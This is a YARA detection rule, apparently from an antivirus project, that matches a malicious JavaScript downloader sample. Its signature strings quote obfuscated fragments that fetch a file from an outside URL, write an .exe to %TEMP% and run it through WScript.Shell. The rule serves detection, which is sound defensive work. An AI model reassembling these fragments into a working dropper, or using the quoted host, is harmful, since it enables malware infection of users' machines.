rule sig_20160330_789225bffe389c8abfa58e8c7bb48f5d {
  meta:
    description = "datamaliciousorder - file 20160330_789225bffe389c8abfa58e8c7bb48f5d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dd72101575010f5cd357c247e325a8f3a19cffef5343891ea0468a28a2d28f6f"

  strings:
    $s1  = "_YT[_X](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "function _Q(_AT, _R){_YA = _YA * 1; return _AT - _R;};" fullword ascii
    $s3  = "var _EU = function _GN() {return WScript[_AL](\"WScript\"+\".Shell\");}(), _YP = 11;" fullword ascii
    $s4  = "if (_YT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _F(){return _LN + \"\";};" fullword ascii
    $s6  = "function _T() {return _EU[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"RDkgrD2W.ex\" + \"e\";};" fullword ascii
    $s7  = "function _MR() {return ((_W == true) && (_W == _I)) ? 1 : _YA;};" fullword ascii
    $s8  = "function _ZH(_MK){_EU[\"Run\"](_MK, _YA, _YA);};" fullword ascii
    $s9  = "function _L()" fullword ascii
    $s10 = "function _S(){return 22;};" fullword ascii
    $s11 = "function _MR0(){return _AL;};" fullword ascii
    $s12 = "return _Q(_D0, _XU);" fullword ascii
    $s13 = " while (_NR){" fullword ascii
    $s14 = "function _IX(_LC) {var _DT = (1, 2, 3, 4, 5, _LC); return _DT;};" fullword ascii
    $s15 = "var _TS = new this[\"Date\"]();" fullword ascii
    $s16 = "_W = true; " fullword ascii
    $s17 = "var _I = false;" fullword ascii
    $s18 = "_I = true; " fullword ascii
    $s19 = "var _QW = false;" fullword ascii
    $s20 = "} catch(_SN){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}